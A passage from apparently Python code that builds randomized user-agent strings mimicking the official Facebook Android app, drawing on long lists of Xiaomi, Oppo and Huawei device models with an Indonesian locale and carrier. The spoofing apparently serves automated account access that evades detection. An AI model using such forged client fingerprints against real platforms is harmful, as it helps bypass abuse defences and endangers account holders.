'Redmi Note 10T', 'M2103K19I', 'A101XM', 'M2003J15SC', 'M2003J15SC', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', '2201117TY', '2201117TG', '2201117TI', '2201117TL', '21091116AC', '21091116AC', '21091116AC', '2201116TG', '21091116C', '2201116TI', '2201116TG', '21091116C', '2201116SG', '2201116SR', '21091116UG', '21091116UC', '2201116SI', '22087RA4DI', '22087RA4DI', '22041219C', '22041219C', 'Redmi Note 11E', '2201116SC', 'Redmi Note 11R', 'Redmi Note 11R', '22095RA98C', '2201117SL', '2201117SY', '2201117SI', '2201117SG', '22031116BG', '21091116I', '21091116AI', '22041216C', '22041216C', '22041216C', '22041216C', '22041216C', '22041216UC', '22041216UC', '22041216UC', '22111317G', '23021RAAEG', '23021RAA2Y', 'Redmi Note 12', 'Redmi Note 12', 'Redmi Note 12', '22101316UP', '22101316G', '22101316I', '22101316C', '22101316C', '22101316UC', '22101316UCP', '22101316UCP', '22101316UCP', '22101316UCP', '22101316UG', '2303CRA44A', 'Redmi Note 12S', '23030RAC7Y', 'Redmi Note 12S', 'Redmi Note 12S', 'Redmi Note 12S', '23049RAD8C', '23049RAD8C', '23049RAD8C', 'Redmi Note 13', 'Redmi Note 1LTE', 'Redmi Note 2', 'Redmi Note 2', 'Redmi Note 27', 'Redmi Note 3', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4', 'Redmi Note 4', 'Redmi Note 4A', 'HM NOTE 1S', 'HM NOTE 1S', 'HM NOTE 1S', 'HM NOTE 1LTE', 'HM NOTE 1LTEW', 'HM NOTE 1LTE', 'HM NOTE 1LTEW', 'HM NOTE 1LTE', 'HM NOTE 1LTE', 'HM NOTE 1LTE', 'HM NOTE 1LTEW', 'Redmi Note 4X', 'Redmi Note 4X', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5', 'Redmi Note 5', 'Redmi Note 5', 'Redmi Note 5A', 'Redmi note 6', 'redmi note 6', 'Redmi Note 6Pro', 'Redmi Note 7', 'Redmi Note 7', 'Redmi Note 7S', 'Redmi Note 7S', 'M1901F71', 'Redmi Note 7S', 'Redmi Note 8', 'Redmi Note 8', 'M1908C3JGG', 'M1908C3JGG', 'Redmi Note 8T', 'Redmi Note 9', 'M2010J19SC', 'M2010J19SC', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'M2007J22C', 'M2007J22C', 'M2007J22C', 'M2007J22C', 'M2007J17C', 'M2007J17C', 'M2007J17C', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'M2007J22G', 'A001XM', 'Redmi Note10 JE', 'Redmi Note7', 'Redmi Note8', 'Redmi Note8T', '22081283G', '22081283C', 'Redmi Pad', 'Redmi Pro', 'Redmi Pro', 'Redmi Pro', 'Redmi Pro', 'Redmi Pro', 'Redmi S2', 'Redmi S2', 'Redmi S2', 'Redmi S2', 'Redmi X', 'Redmi Y1', 'Redmi Y1', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y1 Lite', 'Redmi Y1 Lite', 'Redmi Y2', 'Redmi Y3', 'Redmi Y3'])
                self.useragent = (f'[FBAN/FB4A;FBAV/{self.app_version};FBBV/{random.randint(000000000, 999999999)};FBDM/' + '{' + str(self.density) + '}' + f';FBLC/id_ID;FBRV/0;FBCR/INDOSAT;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{self.android_model};{self.android_version};FBCA/{self.arm64_v7a};]')
            elif "Oppo" in str(self.device):
                self.android_model = random.choice(['OPPO 1105', 'oppo 15', 'Oppo 3T', 'Oppo 62A', 'oppo6779', 'oppo6833', 'OPPO7273', 'Oppo 9A', 'Oppo A1', 'PHQ110', 'PHQ110', 'PCHM10', 'PCHM10', 'PCHM10', 'PCHM10', 'CPH2071', 'PCHT30', 'PCHM00', 'CPH2083', 'CPH2083', 'CPH2083', 'CPH2185', 'CPH2179', 'CPH2269', 'CPH2421', 'CPH2349', 'CPH2271', 'CPH2477', 'CPH2471', 'CPH2471', 'CPH1923', 'CPH1923', 'CPH1923', 'CPH1923', 'CPH1925', 'oppo A25', 'CPH1837', 'PADT00', 'PADM00', 'CPH1837', 'PADM00', 'OPPO A30', 'OPPO A30', 'OPPO A30', 'CPH2015', 'CPH2015', 'CPH2015', 'CPH2015', 'CPH2015', 'CPH2015', 'OB-OPPO A31c', 'PDVM00', 'PDVM00', 'PDVM00', 'PDVM00', 'CPH2137', 'OPPO A33', 'OPPO A33m', 'OPPO A33t', 'OPPO A34', 'Oppo A34', 'PEFM00', 'PEFM00', 'PEFM00', 'PEFM00', 'PESM10', 'PESM10', 'PESM10', 'PESM10', 'OPPO A36', 'OPPO A37m', 'OPPO A37f', 'A37fw', 'OPPO A37t', 'OPPO A37t', 'OPPO A38', 'CPH1605', 'CPH1605', 'CPH1803', 'OPPO CPH1803', 'OPPO CPH1803', 'OPPO PBBM30', 'CPH1803', 'CPH1853', 'Oppo A4', 'OPPO A40', 'Oppo A400', 'OPPO A41', 'OPPO A42', 'OPPO A43', 'Oppo A43', 'OPPO A44', 'OPPO A45', 'Oppo A45', 'OPPO A46', 'OPPO A47', 'OPPO A48', 'OPPO A49', 'OPPO PBBT30', 'PBAM00', 'CPH1809', 'OPPO PBAT00', 'OPPO PBAM00', 'PBAM00', 'CPH1809', 'CPH1809', 'OPPO PBAM00', 'PBAT00', 'CPH1931', 'CPH1933', 'OPPO A50', 'OPPO A51', 'oppo A51', 'CPH2069', 'CPH2061', 'CPH2061', 'CPH2127', 'CPH2139', 'PECM20', 'PECT30', 'PECM30', 'PECM30', 'OPPO A53m', 'OPPO A53m', 'OPPO A53m', 'CPH2135', 'CPH2321', 'CPH2239', 'CPH2239', 'CPH2195', 'OPG02', 'CPH2273', 'CPH2325', 'PEMT20', 'PEMM20', 'PEMT00', 'PEMM00', 'PEMM00', 'PEMM20', 'PEMM00', 'PEMM20', 'A102OP', 'CPH2309', 'OPPO A56', 'PFVM10', 'PFVM10', 'CPH2407', 'OPPO A57', 'CPH1701', 'OPPO A57', 'CPH1701', 'OPPO A57t', 'OPPO A57t', 'OPPO A57t', 'OPPO A57t', 'OPPO A57t', 'CPH2387', 'PHJ110', 'PHJ110', 'PHJ110', 'PHJ110', 'PHJ110', 'OPPO A59', 'OPPO A59m', 'OPPO A59m', 'OPPO A59s', 'OPPO A59S', 'OPPO A59s', 'OPPO A59st', 'OPPO A59t', 'CPH1909', 'CPH1901', 'OPPO PBFT00', 'OPPO PBFM00', 'CPH1717', 'CPH1801', 'CPH1801', 'Oppo A71A', 'CPH2067', 'PDYM20', 'PDYM10', 'PDYT10', 'OPPO A73', 'OPPO A73', 'OPPO A73', 'OPPO A73', 'OPPO A73', 'CPH2161', 'CPH2099', 'OPPO A73t', 'OPPO A73t', 'OPPO A73t', 'CPH2219', 'OPPO CPH2219', 'CPH2197', 'CPH2263', 'CPH2375', 'CPH1715', 'OPPO A77', 'CPH2339', 'CPH2385', 'CPH2473', 'OPPO A77t', 'OPPO A77t', 'OPPO A77t', 'OPPO A77t', 'CPH2483', 'OPPO A79', 'OPPO A79', 'OPPO A79kt', 'OPPO A79', 'OPPO A79k', 'OPPO A79k', 'OPPO A79t', 'OPPO A79t', 'OPPO A79t', 'OPPO A79t', 'PCDM00', 'OPPO PCDM00', 'PCDM00', 'PCDM00', 'PCDT00', 'PBBM00', 'PBBM00', 'PBBM00', 'PBBT00', 'PDBM00', 'PDBM00', 'PDBM00', 'PDBM00', 'OPPO A83', 'CPH1729', 'OPPO A83', 'CPH1827', 'CPH1827', 'OPPO A83t', 'OPPO A83t', 'OPPO A83t', 'PCAM10', 'PCAM10', 'PCAM10', 'CPH1938', 'PCAT10', 'PCAM10', 'CPH1938', 'CPH1937', 'CPH1941', 'CPH2001', 'CPH2021', 'PCPM00', 'CPH2001', 'CPH2001', 'CPH2001', 'CPH2001', 'CPH2059', 'PDKT00', 'PDKM00', 'PDKT00', 'PDKT00', 'PDKM00', 'CPH2121', 'PEHM00', 'CPH2123', 'PFGM00', 'PFGM00', 'PFGM00', 'CPH2203', 'CPH2333', 'CPH2365', 'PHA120', 'PHA120', 'OPPO A96', 'PFUM10', 'PFUM10', 'PFUM10', 'PFTM10', 'PFTM10', 'Oppo A98', 'PCEM00', 'PCEM00', 'PCET00', 'CPH1851', 'CPH1920', 'CPH1903', 'A1603', 'OPPOCNM632', 'CPH1114', 'CPH1235', 'CPH1451', 'CPH1615', 'CPH1664', 'CPH1869', 'CPH1869', 'CPH1929', 'CPH1985', 'CPH2048', 'CPH2048', 'CPH2048', 'CPH2107', 'CPH2238', 'CPH2332', 'CPH2351', 'CPH2389', 'CPH2419', 'CPH2451', 'CPH2465', 'CPH2467', 'CPH2529', 'CPH2531', 'CPH2531', 'CPH2589', 'CPH2643', 'CPH3475', 'CPH3669', 'CPH3682', 'CPH3731', 'CPH3776', 'CPH3785', 'CPH4125', 'CPH4275', 'CPH4299', 'CPH4395', 'CPH4473', 'CPH4987', 'CPH5286', 'CPH5841', 'CPH5947', 'CPH6178', 'CPH6244', 'CPH6271', 'CPH6316', 'CPH6519', 'CPH6528', 'CPH6697', 'CPH7338', 'CPH7364', 'CPH7382', 'CPH7532', 'CPH7577', 'CPH7991', 'CPH8153', 'CPH8346', 'CPH8347', 'CPH8363', 'CPH8393', 'CPH8467', 'CPH8472', 'CPH8534', 'CPH8686', 'CPH8893', 'CPH9177', 'CPH9226', 'CPH9659', 'CPH9667', 'CPH9716', 'CPH9763', 'CPH9929', 'oppo f 5 plus', 'OPPO F1 Plus', 'Oppo F1', 'Oppo F1', 'X9009', 'OPPO R9m', 'X9009', 'Oppo F10', 'CPH1911', 'CPH1969', 'Oppo F11Pro', 'CPH2095', 'CPH2119', 'OPPO F19', 'Oppo F19', 'CPH2285', 'CPH2285', 'CPH2213', 'CPH2213', 'CPH2223', 'A1601', 'OPPO F1s', 'OPPO F1s', 'A1601', 'CPH2341', 'CPH2461', 'CPH2455', 'CPH2461', 'CPH2455', 'CPH2527', 'CPH1609', 'CPH1609', 'CPH1609', 'CPH1613', 'CPH1727', 'CPH1723', 'CPH1727', 'CPH1723', 'CPH1723', 'CPH1725', 'CPH1725', 'Oppo F51', 'Oppo F61 Pro', 'CPH1819', 'CPH1821', 'CPH1819 Flow', 'CPH1881', 'CPH1825', 'CPH1825', 'CPH1881', 'CPH1881', 'CPH1825', 'CPH1881', 'CPH1823', 'X909', 'X909', 'R827T', 'R827T', 'R827', 'X9076', 'X9077', 'X9070', 'X9077', 'X9076', 'X9077', 'X9006', 'X9007', 'X9000', 'X9007', 'X9006', 'X9006', 'R815W', 'R815T', 'R815', 'R8111', 'OPPOR8111', 'R821T', 'R821', 'R821', 'PEUM00', 'PEUM00', 'PEUM00', 'PEUM00', 'PGU110', 'PGU110', 'CPH2437', 'PGT110', 'U707T', 'PAFM00', 'CPH1875', 'PAFT00', 'CPH1871', 'PAHM00', 'PAHM00', 'PAHM00', 'PAHM00', 'CPH2023', 'PDEM10', 'CPH2005', 'CPH2025', 'Find X2 Pro', 'PDEM30', 'PEDM00', 'PEDM00', 'Find X3 Neo', 'CPH2173', 'OPG03', 'PEEM00', 'CPH2307', 'PFFM10', 'CPH2305', 'PFEM10', 'OPPOJLAJH6', 'R1011', 'PBCM30', 'PBCM30', 'PBCM30', 'PBCM30', 'PBCM30', 'PBCT10', 'CPH2373', 'PGJM10', 'CPH2337', 'PGIM10', 'PGGM10', 'PGGM10', 'CPH1955', 'PCNM00', 'PCNM00', 'PCNM00', 'PCLM50', 'PCLM50', 'PCLM50', 'PERM00', 'PERM00', 'PERM00', 'PEXM00', 'PEXM00', 'PEXM00', 'PEYM00', 'PEYM00', 'PEYM00', 'PERM10', 'PERM10', 'PGCM10', 'PGCM10', 'PGCM10', 'N5117', 'N5117', 'N5117', 'N1T', 'N1T', 'N5209', 'N5207', 'N5207', 'R831T', 'R831T', 'R831', 'Oppo Neo 7', 'R831K', 'R831K', 'R831K', '1201', 'A33w', 'A33f', 'A33fw', 'OPD2102A', 'OPD2101', 'OPPO R10', 'R1001', 'OPPO R11', 'OPPO R11t', 'OPPO R11t', 'OPPO R11t', 'OPPO R11t', 'OPPO R11', 'OPPO R11 Plusk', 'OPPO R11 Plus', 'OPPO R11 Plus', 'OPPO R11 Pluskt', 'OPPO R11plus', 'OPPO R11s', 'OPPO R11s', 'OPPO R11st', 'OPPO R11s', 'CPH1719', 'OPPO R11st', 'OPPO R11s', 'OPPO R11s', 'CPH1721', 'OPPO R11s Plus', 'OPPO R11s Plust', 'PAAM00', 'PACM00', 'PACM00', 'PACT00', 'CPH1835', 'PAAM00', 'CPH1831', 'PBCM10', 'PBCM10', 'PBCM10', 'PBCM10', 'PBCM10', 'PBEM00', 'CPH1879', 'PBET00', 'PBEM00', 'CPH1893', 'CPH1893', 'CPH1893', 'CPH1893', 'CPH1877', 'PBDM00', 'PBDT00', 'R8001', 'R8006', 'R8006', 'R8007', 'R8000', 'R8007', 'R8007', 'R8200', 'R8201', 'R8200', 'R8206', 'R2001', 'R2010', 'R2017', 'R2017', 'R8107', 'R8109', 'R8106', 'R8107', 'Oppo R53', 'R6007', 'R7g', 'OPPO R7', 'R7f', 'OPPO R7', 'OPPO R7', 'R7kf', 'R7Plus', 'R7Plusm', 'R7Plus', 'R7Plust', 'R7Plusm', 'R7Plust', 'R7Plusm', 'R7plusf', 'R7005', 'R7007', 'R7007', 'R7sf', 'OPPO R7s', 'OPPO R7sPlus', 'OPPO R7sPlus', 'OPPO R7sm', 'OPPO R7sm', 'oppo r7sm', 'OPPO R7sm', 'OPPO R7sm', 'OPPO R7st', 'OPPO R7t', 'OPPO R7t', 'R801', 'R805', 'OPPOR805', 'R811', 'R819', 'R819T', 'R819T', 'R819T', 'R8205', 'R8207', 'R8207', 'R8207', 'R823T', 'R829', 'R829T', 'R830', 'R830S', 'R833T', 'OPPO R9 Plusm A', 'OPPO R9 Plustm A', 'OPPO R9 Plusm A', 'OPPO R9 Plusm A', 'OPPO R9 Plusm A', 'OPPO R9 Plustm A', 'X9079', 'OPPO R9km', 'OPPO R9km', 'OPPO R9km', 'OPPO R9sk', 'OPPO R9sk', 'CPH1607', 'OPPO R9st', 'CPH1611', 'OPPO R9s Plus', 'OPPO R9t', 'OPPO R9t', 'OPPO R9tm', 'OPPO R9tm', 'OPPO R9tm', 'OPPO R9tm', 'CPH1917', 'PCAM00', 'PCAM00', 'PCAM00', 'PCAT00', 'PCCT00', 'PCCT00', 'CPH1919', 'PCCM00', 'CPH1907', 'CPH1907', 'CPH1907', 'CPH1907', 'PCKM00', 'CPH1907', 'CPH1989', 'CPH1989', 'CPH1951', 'CPH1945', 'CPH1945', 'CPH2043', 'CPH2043', 'PDCM00', 'A001OP', 'PDCM00', 'PDCM00', 'PCRT01', 'PCRT01', 'CPH2009', 'CPH2035', 'CPH2037', 'CPH2013', 'A002OP', 'CPH2113', 'CPH2091', 'PDPM00', 'PDPT00', 'CPH2125', 'CPH2109', 'CPH2109', 'PDNM00', 'CPH2089', 'PDNM00', 'PDNT00', 'PEAT00', 'PEAM00', 'PEAM00', 'CPH2209', 'CPH2065', 'CPH2159', 'CPH2159', 'CPH2145', 'PEGM00', 'CPH2205', 'CPH2207', 'PDSM00', 'CPH2201', 'PDST00', 'PDSM00', 'PDRM00', 'PDRM00', 'PDRM00', 'PDRM00', 'PDRM00', 'CPH2199', 'A101OP', 'A103OP', 'CPH2217', 'CPH1921', 'PEGM10', 'PEGT10', 'PEGT10', 'PEGM10', 'PEGT10', 'CPH2211', 'CPH2235', 'CPH2251', 'PEQM00', 'PEPM00', 'PEPM00', 'CPH2247', 'CPH2249', 'PENM00', 'PENM00', 'PENM00', 'PENM00', 'CPH2237', 'CPH2237', 'CPH2371', 'CPH2363', 'CPH2293', 'PFDM00', 'PFCM00', 'PFCM00', 'PFCM00', 'A201OP', 'CPH2353', 'OPG04', 'CPH2343', 'PGBM10', 'PGBM10', 'PGBM10', 'CPH2357', 'CPH2359', 'PFZM10', 'CPH2457', 'CPH2481', 'CPH2505', 'PHM110', 'PHM110', 'PHM110', 'PHM110', 'PGX110', 'PGX110', 'PGX110', 'PGW110', 'PGW110', 'PGW110', 'CPH1983', 'CPH1983', 'PCLM10', 'PCLM10', 'PCLM10', 'PCLM10', 'PDHM00', 'arm_64 PDHM00', 'PDHM00', 'PCGM00', 'PCGM00', 'PCGM00', 'PCGM00', 'CPH1979', 'PCDM10', 'CPH1979', 'Oppo Reno2 /MMB29M', 'OPPO Reno5 Pro Plus', 'Oppo S1', 'Oppo S17', 'Oppo S4', 'OPPOT29', 'U705T', 'U705T', 'Oppo V5', 'OW20W1', 'OW19W2', 'OW19W3', 'OW19W1', 'oppo x', 'Oppo X', 'OPPO x20 70816.012', 'OPPO x22 6.012', 'OPPOX9017', 'OPPOX907', 'OPPOX907', 'Oppo Y15', 'Oppo Y21', 'Oppo Y3', 'Oppo Z1'])
                self.useragent = (f'[FBAN/FB4A;FBAV/{self.app_version};FBBV/{random.randint(000000000, 999999999)};FBDM/' + '{' + str(self.density) + '}' + f';FBLC/id_ID;FBRV/0;FBCR/INDOSAT;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/{self.android_model};{self.android_version};FBCA/{self.arm64_v7a};]')
            elif "Huawei" in str(self.device):
                self.android_model = random.choice(['POT-AL00a', 'POT-TL00a', 'POT-AL00a', 'POT-AL00a', 'POT-AL00a', 'POT-AL00a', 'Huawei Ascend', 'U9500', 'U9500', 'U9500', 'U9500', 'U9500', 'U8818', 'HUAWEI U8818', 'HUAWEI U8818', 'HUAWEI U8818', 'U8818', 'U8818', 'U8818', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'HUAWEI G6-L11', 'G620S-L01', 'C8817D', 'G620S-L03', 'G620S-L01', 'C8817D', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G7-L01', 'HUAWEI G7-L01', 'Huawei G700', 'HUAWEI G700-U20', 'HUAWEI G700-T00', 'HUAWEI G700-U10', 'Huawei g700', 'HUAWEI G700-U00', 'HUAWEI G700-T00', 'HUAWEI G700-U20', 'HUAWEI G700-U10', 'HUAWEI G700-U00', 'HUAWEI G730-C00', 'HUAWEI G730-C00', 'HUAWEI G730-C00', 'HUAWEI MT1-U06', 'HUAWEI MT1-U06', 'HUAWEI MT2-L01', 'HUAWEI MT2-L01', 'HUAWEI MT2-C00', 'HUAWEI MT2-C00', 'MT2L03', 'MT2L03', 'HUAWEI Y360', 'HUAWEI MT7-L09', 'HUAWEI MT7-TL10', 'HUAWEI MT7-TL00', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9202L-1', 'U9202L-1', 'U9202L-1', 'U9202L-1', 'U9202L-1', 'U9202L-3', 'U9202L-1', 'U9202L-1', 'U9202L-4', 'U9202L-2', 'U9202L-1', 'U9202L-1', 'U9202L-1', 'U9202L-3', 'U9202L-2', 'HUAWEI P6 S-U06', 'HUAWEI P7-L10', 'Flow', 'H1711', 'HUAWEI Y221-U53', 'HUAWEI Y221-U22', 'HUAWEI Y221-U12', 'HUAWEI Y221-U03', 'HUAWEI Y221-U53', 'HUAWEI Y221-U22', 'Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'Bucare Y330-U05', 'Bucare Y330-U05', 'HUAWEI Y330-U05', 'HUAWEI Y330-U05', 'HUAWEI Y330-U05', 'HUAWEI Y330-U05', 'HUAWEI Y330-U05', 'Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'Y550-L03', 'HUAWEI Y560-L01', 'HUAWEI Y541-U02', 'HUAWEI B199', 'HUAWEI B199', 'HUAWEI B199', 'HUAWEI B199', 'HUAWEI B199', 'Huawei Blaze', 'Huawei BLAZE', 'HUAWEI C199', 'HUAWEI C199', 'HUAWEI C199', 'HUAWEI C199', 'HUAWEI C199s', 'HUAWEI C199s', 'HW-HUAWEI C199s', 'EC6109V1', 'MTS-SP101', 'MTS-SP101', 'MTS-SP101', 'C8512', 'C8600', 'C8600', 'C8600', 'C8600', 'C8650', 'C8650', 'id C8650', 'HUAWEI C8655', 'HUAWEI C8655', 'C8800', 'HW-HUAWEI_C8810', 'HUAWEI C8812', 'HUAWEI C8812', 'HUAWEI_C8812', 'HUAWEI C8812', 'HUAWEI C8812', 'HUAWEI C8812', 'HUAWEI C8812E', 'HUAWEI_C8812E', 'HUAWEI C8813', 'HUAWEI C8813', 'HUAWEI C8813', 'HUAWEI C8813', 'HUAWEI C8813', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813DQ', 'HUAWEI C8813DQ', 'HUAWEI C8813Q', 'HUAWEI C8813Q', 'HUAWEI C8813Q', 'HUAWEI C8813Q', 'HUAWEI C8815', 'HUAWEI C8815', 'HUAWEI C8816', 'HUAWEI C8816', 'HUAWEI C8816', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI_C8816D', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI C8817E', 'HUAWEI C8817E', 'HUAWEI C8817E', 'HUAWEI C8817L', 'HUAWEI C8817L', 'HUAWEI C8817L', 'HUAWEI C8817L', 'HUAWEI C8817L', 'HUAWEI C8818', 'HUAWEI C8818', 'HUAWEI C8818', 'HUAWEI C8825D', 'HUAWEI C8825D', 'HUAWEI C8825D', 'HUAWEI-C8850', 'HUAWEI C8860E', 'HUAWEI C8860E', 'HUAWEI C8860E', 'C8860V', 'HUAWEI C8950D', 'HUAWEI C8950D', 'HUAWEI C8950D', 'HUAWEI C8950D', 'CM980', 'CM980', 'd-02K', 'd-02H', 'd-01J', 'U9510', 'U9510', 'HUAWEI D2', 'Huawei D2', 'HUAWEI D8950D', 'MediaPad 10 FHD', 'dtab01', 'EC6108V9-01', 'ART-AL00x', 'ART-AL00x', 'ART-AL00x', 'ART-TL00x', 'ART-AL00m', 'ART-AL00x', 'STK-AL00', 'STK-AL00', 'STK-AL00', 'STK-TL00', 'MED-TL00', 'MED-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-TL00', 'WKG-AN00', 'WKG-AN00', 'WKG-TN00', 'WKG-TN00', 'FRL-TN00', 'FRL-AN00a', 'FRL-AN00a', 'FRL-AN00a', 'FRL-AN00a', 'FRL-AN00a', 'FRL-TN00', 'FRL-AN00a', 'DVC-TN20', 'DVC-AN20', 'DVC-TN20', 'DVC-AN20', 'DVC-AN20', 'DVC-AN20', 'DVC-TN20', 'DVC-TN20', 'DVC-AN20', 'DVC-TN20', 'MLD-AL00', 'MLD-AL00', 'MGA-AL00', 'MGA-AL00', 'MGA-AL00', 'MGA-AL00', 'CTR-AL00', 'CTR-AL00', 'CTR-AL00', 'CTR-AL00', 'HUAWEI TAG-L01', 'HUAWEI TAG-L32', 'HUAWEI TAG-AL00', 'HUAWEI TAG-L21', 'HUAWEI TAG-L13', 'HUAWEI TAG-L03', 'NCE-TL10', 'NCE-AL10', 'NCE-AL00', 'NCE-TL10', 'NCE-AL00', 'NCE-AL10', 'DIG-TL10', 'DIG-AL00', 'DIG-AL00', 'DIG-AL00', 'DIG-AL00', 'SLA-TL10', 'SLA-AL00', 'SLA-TL10', 'SLA-TL10', 'TRT-AL00A', 'TRT-TL10A', 'FIG-AL10', 'FIG-TL10', 'FIG-AL00', 'FIG-TL00', 'FIG-AL10', 'LDN-TL20', 'LDN-AL20', 'LDN-AL10', 'LDN-TL00', 'LDN-TL20', 'FLA-AL10', 'FLA-AL10', 'FLA-AL10', 'ATU-AL10', 'DUB-AL00a', 'DUB-AL00a', 'DUB-AL00a', 'MRD-AL00', 'Huawei Enjoy 9s', 'Huawei Enjoy 9s', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'CM990', 'CM990', 'CM990', 'U8665', 'HUAWEI U8665', 'U8665', 'G735-L03', 'G735-L23', 'G735-L12', 'G735-L23', 'G735-L23', 'CHC-U03', 'CHC-U01', 'Huawei G500 pro', 'HUAWEI G510', 'HUAWEI G510', 'Huawei G510', 'Huawei G520', 'HUAWEI G520 T', 'HUAWEIG520L', 'HUAWEI G520T', 'Huawei G530', 'Huawei G600', 'Huawei G610 u20', 'Huawei G610', 'HUAWEI G610', 'HUAWEI G610 fa', 'HUAWEI G620', 'G621-TL00', 'G621-TL00M', 'G621-TL00', 'HUAWEI G628', 'HUAWEI G7', 'HUAWEI RIO-TL00', 'HUAWEI RIO-UL00', 'HUAWEI_G750', 'Huawei_g750', 'HUAWEI G750', 'HUAWEI G7500', 'HUAWEI G7500', 'HUAWEI G7500', 'HUAWEI G7500', 'HUAWEI G7500', 'Huawei G760', 'HUAWEI RIO-L01', 'HUAWEI VNS-AL00', 'HUAWEI VNS-TL00', 'HUAWEI MLA-TL00', 'HUAWEI MLA-TL00', 'HUAWEI G9 Youth', 'DIG-L21', 'DIG-L22', 'HUAWEI KII-L21', 'BLL-L22', 'BLL-L21', 'BLL-L21', 'HUAWEI NMO-L31', 'HUAWEI RIO-L03', 'H1611', 'H1611', 'H1621', 'H1621', 'HUAWEI H1621', 'H1623', 'H710VL', 'H715BL', 'H866C', 'H866C', 'H866C', 'H866C', 'H866C', 'Huawei-H867G', 'Huawei-H867G', 'Huawei-H867G', 'Huawei-H867G', 'HUAWEI H868C', 'HUAWEIH868C', 'HUAWEI H868C', 'HUAWEI H871G', 'HUAWEI H871G', 'HUAWEI H871G', 'HUAWEI H881C', 'HUAWEI H881C', 'HUAWEI H881C', 'HUAWEI H881C', 'HUAWEI_H881C', 'H882L', 'H882L', 'HUAWEI H891L', 'HUAWEI H892L', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'HUAWEI U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'COL-L29', 'COL-AL10', 'COL-L29', 'HRY-LX1', 'HRY-LX1MEB', 'HRY-AL00', 'HRY-AL00a', 'HRY-LX1T', 'HUAWEI U9508', 'HUAWEI U9508', 'HUAWEI U9508', 'YAL-L21', 'LRA-AL00', 'LRA-AL00', 'LRA-AL00', 'LRA-AL00', 'YAL-AL10', 'YAL-AL10', 'YAL-AL10', 'YAL-AL10', 'YAL-L41', 'YAL-L41', 'HRY-AL00T', 'HRY-AL00Ta', 'HRY-AL00Ta', 'HRY-AL00Ta', 'HRY-AL00Ta', 'HRY-AL00T', 'HRY-AL00Ta', 'YAL-AL50', 'MAR-LX1H', 'MAR-LX1H', 'BMH-AN20', 'BMH-AN10', 'BMH-AN10', 'MXW-AN00', 'MXW-AN00', 'MXW-AN00', 'MXW-AN00', 'MXW-TN00', 'MXW-AN00', 'MXW-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN10', 'EBG-AN10', 'LRA-LX1', 'CDY-NX9A', 'CDY-AN95', 'CDY-AN90', 'HONOR H30-L01M', 'H30-U10', 'H30-T10', 'H30-T00', 'H30-C00', 'Hol-U19', 'Hol-U19', 'Hol-U19', 'HUAWEI G750-T01', 'HUAWEI G750-T01', 'HUAWEI G750-T01', 'SCL-AL00', 'SCL-TL00', 'SCL-TL00H', 'SCL-AL00', 'SCL-CL00', 'SCL-TL00H', 'SCL-AL00', 'SCL-AL00', 'CHM-U01', 'Honor 4c Pro', 'Honor 4c pro', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'Che1-CL20', 'Che2-UL00', 'Che2-TL00M', 'CHE2-TL00', 'CHE-TL00', 'Che1-CL10', 'Che2-TL00', 'CHE-TL00H', 'Che2-L11', 'CUN-AL00', 'CUN-TL00', 'CUN-TL00', 'NTH-AN00', 'NTH-NX9', 'NTH-AN00', 'NTN-L22', 'NTN-LX3', 'NTN-LX1', 'RNA-AN00', 'JLH-AN00', 'JLH-AN00', 'CAM-AL00', 'CAM-TL00', 'CAM-AL00', 'NEM-AL10', 'NEM-L51', 'NEM-UL10', 'NEM-L51', 'NEM-L22', 'KIW-L21', 'KIW-AL10', 'KIW-UL00', 'KIW-TL00', 'H60-L02', 'H60-L04', 'H60-L01', 'H60-L02', 'H60-L03', 'H60-L11', 'H60-L01', 'MYA-TL10', 'huawei mya-tl10', 